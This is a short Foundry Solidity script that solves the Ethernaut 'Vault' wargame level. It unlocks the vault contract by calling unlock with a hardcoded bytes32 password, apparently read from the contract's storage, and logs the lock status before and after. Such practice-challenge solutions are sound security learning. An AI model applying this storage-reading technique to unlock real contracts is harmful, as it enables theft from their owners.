//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Vault} from "src/ethernaut8.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut7Script is Script{
    Vault instance = Vault(0x8A39ce16708616A8A1Ec58E56D589C785aA20296);
    bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("status : ", instance.locked());
        instance.unlock(password);
        console.log("status : ", instance.locked());
       

        vm.stopBroadcast();
    }
}

